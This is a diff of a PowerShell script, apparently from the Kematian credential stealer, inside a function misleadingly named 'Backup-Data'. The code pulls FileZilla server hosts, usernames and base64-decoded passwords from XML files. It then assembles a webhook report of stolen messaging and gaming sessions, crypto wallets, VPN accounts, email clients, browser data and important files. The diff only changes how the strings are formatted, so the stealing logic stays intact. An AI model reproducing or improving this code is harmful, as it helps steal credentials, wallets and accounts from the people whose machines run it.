@@ -607,23 +607,11 @@ function Backup-Data {
             $serverPort = $matches.Groups[2].Value
             $serverUser = [regex]::Match($xmlContent, "<User>(.*?)</User>").Groups[1].Value
             # Check if both User and Pass are blank
-            if ([string]::IsNullOrWhiteSpace($serverUser)) {
-                return @"
-Host: $serverHost
-Port: $serverPort
-
-"@
-            }
+            if ([string]::IsNullOrWhiteSpace($serverUser)) {return "Host: $serverHost `nPort: $serverPort`n"}
             # if User is not blank, continue with authentication details
             $encodedPass = [regex]::Match($xmlContent, "<Pass encoding=`"base64`">(.*?)</Pass>").Groups[1].Value
             $decodedPass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPass))
-            return @"
-Host: $serverHost
-Port: $serverPort
-User: $serverUser
-Pass: $decodedPass
-
-"@
+            return "Host: $serverHost `nPort: $serverPort `nUser: $serverUser `nPass: $decodedPass`n"
         }       
         $serversInfo = @()
         foreach ($xmlFile in @($recentServersXml, $siteManagerXml)) {
@@ -980,17 +968,7 @@ Pass: $decodedPass
         }
 
         # Add data to webhook
-        $webhookData = @"
-Messaging Sessions: $messaging_sessions_info
-Gaming Sessions: $gaming_sessions_info
-Crypto Wallets: $wallets_found_info
-VPN Accounts: $vpn_accounts_info
-Email Clients: $email_clients_info
-Important Files: $important_files_info
-Browser Data: $browser_data_info
-FileZilla: $filezilla_info
-"@
-
+        $webhookData = "Messaging Sessions: $messaging_sessions_info `nGaming Sessions: $gaming_sessions_info `nCrypto Wallets: $wallets_found_info `nVPN Accounts: $vpn_accounts_info `nEmail Clients: $email_clients_info `nImportant Files: $important_files_info `nBrowser Data: $browser_data_info `nFileZilla: $filezilla_info"
         return $webhookData
     }     
     $kematainwebhook = kematianinfo
